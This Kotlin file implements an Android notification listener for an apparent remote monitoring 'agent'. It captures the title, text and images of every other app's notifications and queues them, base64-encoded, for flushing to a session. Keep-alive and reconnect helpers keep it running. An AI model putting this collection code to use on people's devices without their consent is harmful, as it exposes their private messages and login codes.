package com.zenvora.agent.service

import android.app.Notification
import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Icon
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import com.zenvora.agent.manager.EventQueue
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class ZenvoraNotificationListener : NotificationListenerService() {
    override fun onListenerConnected() {
        super.onListenerConnected()
        SessionPinger.requestFlush(applicationContext)
        KeepAlive.startService(applicationContext)
        ConnectionHealer.heal(applicationContext, "notification_listener")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        if (sbn.packageName == packageName) return
        val extras = sbn.notification?.extras
        val item = JSONObject().apply {
            put("app", sbn.packageName)
            put("title", extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "")
            put("message", extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                ?: extras?.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                ?: "")
            put("category", sbn.notification?.category ?: "")
            put("timestamp", sbn.postTime)
            encodeBitmap(extractPicture(sbn.notification))?.let { put("image", it) }
            encodeBitmap(extractIcon(sbn.notification), maxSide = 96)?.let { put("icon", it) }
        }
        EventQueue.add(applicationContext, "FETCH_SYSTEM_NOTIFICATIONS", item)
        SessionPinger.requestFlushDebounced(applicationContext)
        KeepAlive.startService(applicationContext)
        sink?.invoke(item)
    }

    private fun extractPicture(notification: Notification?): Bitmap? {
        if (notification == null) return null
        val extras = notification.extras ?: return null
        // Messaging / BigPicture style
        val picture = extras.get(Notification.EXTRA_PICTURE)
        when (picture) {
            is Bitmap -> return picture
            is Icon -> if (Build.VERSION.SDK_INT >= 23) {
                return iconToBitmap(picture)
            }
        }
            val largeIcon = if (Build.VERSION.SDK_INT >= 31) {
                extras.get(Notification.EXTRA_LARGE_ICON_BIG)
                    ?: extras.get(Notification.EXTRA_LARGE_ICON)
            } else {
                extras.get(Notification.EXTRA_LARGE_ICON)
            }
        when (largeIcon) {
            is Bitmap -> return largeIcon
            is Icon -> if (Build.VERSION.SDK_INT >= 23) {
                return iconToBitmap(largeIcon)
            }
        }
        return null
    }

    private fun extractIcon(notification: Notification?): Bitmap? {
        if (notification == null) return null
        if (Build.VERSION.SDK_INT >= 23) {
            notification.getLargeIcon()?.let { return iconToBitmap(it) }
        }
        @Suppress("DEPRECATION")
        notification.largeIcon?.let { return it }
        return null
    }

    private fun iconToBitmap(icon: Icon): Bitmap? {
        return try {
            val drawable = icon.loadDrawable(this) ?: return null
            if (drawable is BitmapDrawable && drawable.bitmap != null) {
                drawable.bitmap
            } else {
                val w = drawable.intrinsicWidth.coerceAtLeast(1).coerceAtMost(512)
                val h = drawable.intrinsicHeight.coerceAtLeast(1).coerceAtMost(512)
                val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
                val canvas = android.graphics.Canvas(bmp)
                drawable.setBounds(0, 0, w, h)
                drawable.draw(canvas)
                bmp
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun encodeBitmap(bitmap: Bitmap?, maxSide: Int = 720): String? {
        if (bitmap == null || bitmap.isRecycled) return null
        return try {
            val scaled = scaleDown(bitmap, maxSide)
            val out = ByteArrayOutputStream()
            var quality = 72
            scaled.compress(Bitmap.CompressFormat.JPEG, quality, out)
            while (out.size() > 180_000 && quality > 35) {
                out.reset()
                quality -= 12
                scaled.compress(Bitmap.CompressFormat.JPEG, quality, out)
            }
            if (scaled !== bitmap) scaled.recycle()
            if (out.size() > 220_000) return null
            "data:image/jpeg;base64," + Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }

    private fun scaleDown(src: Bitmap, maxSide: Int): Bitmap {
        val w = src.width
        val h = src.height
        val longest = maxOf(w, h)
        if (longest <= maxSide) return src
        val scale = maxSide.toFloat() / longest
        return Bitmap.createScaledBitmap(src, (w * scale).toInt().coerceAtLeast(1), (h * scale).toInt().coerceAtLeast(1), true)
    }

    companion object {
        @Volatile
        var sink: ((JSONObject) -> Unit)? = null
    }
}
